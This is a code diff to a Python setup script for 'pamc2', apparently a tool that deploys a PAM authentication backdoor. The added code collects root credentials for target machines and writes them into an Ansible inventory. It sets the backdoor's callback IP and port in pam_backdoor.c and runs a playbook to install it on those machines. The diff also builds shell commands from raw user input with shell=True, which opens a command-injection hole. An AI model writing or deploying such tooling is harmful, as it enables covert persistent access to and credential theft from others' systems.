@@ -1,6 +1,9 @@
 #!/usr/bin/python3
-import os
+import re
 import argparse
+import fileinput
+import subprocess
+import ansible_runner
 
 def setup_cmd_args():
     parser = argparse.ArgumentParser(description="Script to setup pamc2 for use on this machine")
@@ -19,6 +22,27 @@ def main():
 
     ansible_user = input("Enter username of user with root access on the target machines: ")
     ansible_password = input("Enter password of this user: ")
+
+    subprocess.run(f'sed -i "s/^ansible_user.*/ansible_user={ansible_user}/" ./inventory.ini', shell=True, text=True)
+    subprocess.run(f'sed -i "s/^ansible_password.*/ansible_password={ansible_password}/" ./inventory.ini', shell=True, text=True)
+    subprocess.run(f'sed -i "s/^ansible_become_password.*/ansible_become_password={ansible_password}/" ./inventory.ini', shell=True, text=True)
+
+    subprocess.run(f'sed -i "s/^#define CALLBACK_IP.*/#define CALLBACK_IP \"{args.ip}\"/" ./pam_backdoor.c', shell=True, text=True)
+    subprocess.run(f'sed -i "s/^#define CALLBACK_PORT.*/#define CALLBACK_PORT {args.port}/" ./pam_backdoor.c', shell=True, text=True)
+
+    setup_ansible = ansible_runner.run(
+        inventory="inventory.ini",
+        playbook="main.yml",
+        tags="setup"
+    )
+
+    if (setup_ansible.status != 'successful'):
+        print("Setup ansible failed... exiting")
+        exit(1)
+
+    
+    
+
 
     
 
